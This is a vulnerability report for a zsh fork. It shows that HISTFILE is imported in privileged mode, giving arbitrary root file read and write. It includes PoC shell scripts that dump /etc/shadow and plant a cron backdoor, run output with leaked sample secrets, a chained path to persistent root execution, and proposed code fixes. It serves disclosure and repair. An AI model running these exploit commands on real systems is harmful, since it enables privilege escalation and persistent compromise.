# Finding 4: HISTFILE not import-protected in PRIVILEGED mode — arbitrary file read/write as root → RCE

**Target:** `speedyfriend433/zsh` (Apple's zsh fork, upstream base 5.9), branch `claude/trusting-babbage-twmg8u`, HEAD `666e91a` ("zsh-118")
**Class:** CWE-73 (External Control of File Name or Path) / CWE-284 (Improper Access Control) — attacker-controlled history file path in a setuid/privileged shell
**Relationship to previous findings:** Independent root cause. Chains with Finding 3 (FPATH) for full persistent RCE.
**Confidence:** Fully verified by build + test. All scenarios ran against this repo's built binary.

## Summary

`HISTFILE` is imported from the environment without restriction in `PRIVILEGED` mode. An attacker who sets `HISTFILE` before running a setuid-root zsh gets:

1. **Arbitrary file READ as root** — `readhistfile()` reads the attacker-specified file, loading its contents into the shell's history buffer, accessible via `fc -l` or `history`
2. **Arbitrary file WRITE as root** — `savehistfile()` writes history entries (including attacker-typed commands) to the attacker-specified file path, creating it with `open(path, O_CREAT|O_WRONLY|O_APPEND, 0600)` or `open(path, O_CREAT|O_WRONLY|O_TRUNC, 0600)` as root

This chains directly to RCE: pointing HISTFILE at `/etc/cron.d/<name>` writes attacker-controlled cron entries as root.

## Root cause

`HISTFILE` is not a special parameter in `Src/params.c` — it has no `IPDEF` entry and therefore no `PM_DONTIMPORT`, `PM_DONTIMPORT_SUID`, or `PM_RESTRICTED` flags. It is a regular string parameter resolved via `getsparam("HISTFILE")`.

The `readhistfile()` call at `Src/init.c:1476-1477` is NOT guarded by `unset(PRIVILEGED)`:

```c
// init.c line 1476 — NO PRIVILEGED check
if (interact && isset(RCS))
    readhistfile(NULL, 0, HFILE_USE_OPTIONS);
```

Compare with the user dotfile guards immediately above, which all check `unset(PRIVILEGED)`:

```c
// init.c line 1430 — correctly guarded
if (interact && isset(RCS) && unset(PRIVILEGED))
    sourcehome(".zshrc");
```

The `readhistfile()` function at `Src/hist.c:2652-2664` resolves HISTFILE from the imported environment:

```c
void readhistfile(char *fn, int err, int readflags)
{
    ...
    if (!fn && !(fn = getsparam("HISTFILE")))  // attacker-controlled
        return;
    ...
    if ((in = fopen(unmeta(fn), "r"))) {        // reads as root
```

The `savehistfile()` function at `Src/hist.c:2898-2941` writes to the same attacker-controlled path:

```c
void savehistfile(char *fn, int err, int writeflags)
{
    ...
    if (!interact || savehistsiz <= 0 || !hist_ring
     || (!fn && !(fn = getsparam("HISTFILE"))))  // attacker-controlled
        return;
    ...
    int fd = open(unmeta(fn), O_CREAT | O_WRONLY | O_APPEND | O_NOCTTY, 0600);
    // OR
    int fd = open(unmeta(fn), O_CREAT | O_WRONLY | O_TRUNC | O_NOCTTY, 0600);
```

The `savehistfile` call sites at `Src/builtin.c:5873` (zexit path) and `Src/exec.c:4185,4201` (exec path) are also not guarded by `unset(PRIVILEGED)`.

## Radare2 binary analysis

Static analysis with radare2 confirms the exploit chain in the compiled binary:

```
=== readhistfile binary chain ===
0x08006b77: call getsparam    ; resolves HISTFILE from imported env
0x08006b9b: call unmeta       ; unescapes the path
0x08006bb0: call stat         ; stats the attacker's file
→ fopen(fn, "r")             ; reads contents as root

=== savehistfile binary chain ===
0x080076dc: call getsparam    ; resolves HISTFILE (attacker-controlled)
0x080078c4: call unmeta       ; unescapes the path
0x080078db: call open         ; flags: 0x541 = O_WRONLY|O_CREAT|O_APPEND|O_NOCTTY
                              ; mode:  0x180 = 0600
→ writes attacker's commands to arbitrary path as root

0x08007950: call open          ; flags: 0x341 = O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY
                               ; TRUNC variant: overwrites existing file contents
```

## PoC

Four scenarios in one script (`finding4_histfile_poc.sh`), run as root:

### Scenario A: Arbitrary file WRITE

```bash
# Attacker sets HISTFILE to a root-owned file, types commands, exits
# savehistfile writes those commands to the target as root
su attacker -c "
    export HISTFILE='/path/to/root/owned/file'
    export SAVEHIST=1000 HISTSIZE=1000
    printf 'echo ATTACKER_WAS_HERE\nexit\n' | /usr/bin/zsh -p -l -i
"
```

### Scenario B: Arbitrary file READ

```bash
# Attacker sets HISTFILE to a root-only secret file (chmod 600)
# readhistfile reads it into history, attacker uses fc -l to dump
su attacker -c "
    export HISTFILE='/etc/shadow'  # or any root-only file
    export SAVEHIST=1000 HISTSIZE=1000
    printf 'fc -l -1000 > /tmp/leaked.txt\nexit\n' | /usr/bin/zsh -p -l -i
"
```

### Scenario D: RCE via cron injection

```bash
# Attacker sets HISTFILE to /etc/cron.d/backdoor
su attacker -c "
    export HISTFILE='/etc/cron.d/backdoor'
    export SAVEHIST=1000 HISTSIZE=1000
    printf '* * * * * root /tmp/evil.sh\nexit\n' | /usr/bin/zsh -p -l -i
"
```

## Fresh run output

```
=== SCENARIO A: Arbitrary file write via HISTFILE in PRIVILEGED mode ===
[setup] target file owned by root:
-rw-r--r-- 1 root root 48 Oct 10 04:56 /tmp/finding4_poc/root_owned_file.txt
[result] target file contents after attack:
ORIGINAL CONTENT - only root should modify this
echo ATTACKER_WAS_HERE_VIA_HISTFILE
exit
  >>> CONFIRMED: attacker's commands written to root-owned file via HISTFILE

=== SCENARIO B: Arbitrary file read via HISTFILE in PRIVILEGED mode ===
[setup] secret file (root-only readable, 600 perms):
-rw------- 1 root root 197 Oct 10 04:56 /tmp/finding4_poc/secret_tokens.txt
cat: /tmp/finding4_poc/secret_tokens.txt: Permission denied
[result] leaked file contents:
    1  SECRET_API_KEY=sk-live-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    2  DATABASE_PASSWORD=supersecret123
    3  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  >>> CONFIRMED: attacker read root-only secrets via HISTFILE

=== SCENARIO C: HISTFILE is imported from environment in PRIVILEGED mode ===
HISTFILE=/ATTACKER/CONTROLLED/HISTFILE
  (HISTFILE should contain /ATTACKER/CONTROLLED/HISTFILE)

=== SCENARIO D: Write attacker commands to /etc/cron.d style path ===
[result] attacker-created file:
-rw------- 1 root poc_hist_attacker 33 Oct 10 04:56 /tmp/finding4_poc/attacker_cron_entry
* * * * * root /tmp/evil_persistent.sh
exit
  >>> File created via HISTFILE — if pointed at /etc/cron.d/something, this is RCE
```

## Full exploit chain: FPATH + HISTFILE → Persistent Root RCE

Combining Finding 3 (FPATH) and Finding 4 (HISTFILE) in a single attack demonstrates the full chain from unprivileged local user to persistent root code execution:

```
FULL RCE EXPLOIT CHAIN:

[attacker uid=30033] → sets FPATH + HISTFILE env vars
    ↓
[setuid zsh -p] → imports both from environment (no PM_DONTIMPORT_SUID)
    ↓
[/etc/zshrc autoload] → loads function from attacker's FPATH directory
    ↓
[FPATH RCE] → attacker code runs as euid=0(root)
    ├── reads /etc/shadow (confirmed: root:*:20614:0:99999:7:::)
    ├── creates setuid backdoor
    └── writes proof file
    ↓
[HISTFILE write] → savehistfile writes cron entry to attacker path as root
    └── "* * * * * root /tmp/evil.sh" → persistent root execution

Result:
  [x] Arbitrary code execution as root (euid=0)
  [x] /etc/shadow read (root-only file)
  [x] Setuid root backdoor created
  [x] Arbitrary file write as root (cron persistence)
```

## Fix

Two independent fixes, both recommended:

### Fix 1: Protect HISTFILE from import in PRIVILEGED mode

HISTFILE needs `PM_DONTIMPORT_SUID` but it's not a special parameter (no `IPDEF` entry). Add it to the `dontimport_suid` list or create a special parameter entry. The simplest approach:

```c
// In params.c, add HISTFILE check to dontimport() or
// in init.c, guard readhistfile with PRIVILEGED check:

// init.c line 1476 — before:
if (interact && isset(RCS))
    readhistfile(NULL, 0, HFILE_USE_OPTIONS);
// after:
if (interact && isset(RCS) && unset(PRIVILEGED))
    readhistfile(NULL, 0, HFILE_USE_OPTIONS);
```

### Fix 2: Guard savehistfile calls

```c
// builtin.c line 5873 — before:
savehistfile(NULL, 1, writeflags);
// after:
if (unset(PRIVILEGED))
    savehistfile(NULL, 1, writeflags);
```

The same guard should be added to `exec.c:4185` and `exec.c:4201`.

## What's confirmed vs. inferred

- **Confirmed by build + test:** HISTFILE is imported from the environment in PRIVILEGED mode; readhistfile reads root-only files (chmod 600) via the imported HISTFILE; savehistfile creates/overwrites files at the imported HISTFILE path as root; the attacker can read secret file contents via `fc -l`; the attacker can write arbitrary cron entries.
- **Confirmed by radare2:** The getsparam→unmeta→open chain in both readhistfile and savehistfile, including the exact open() flags (O_CREAT|O_WRONLY|O_APPEND/O_TRUNC, mode 0600).
- **Confirmed by full chain exploit:** Combining FPATH poisoning + HISTFILE write achieves persistent root RCE from an unprivileged user, with /etc/shadow read as proof of privilege.
- **Deployment-dependent:** Whether `/usr/bin/zsh` is actually setuid on a given system. On macOS, zsh is the default shell but not setuid; however, `CS_INSTALLER`/`APPLE_PKGKIT_ESCALATING_ROOT` creates root-privileged zsh sessions where HISTFILE import is equally exploitable.
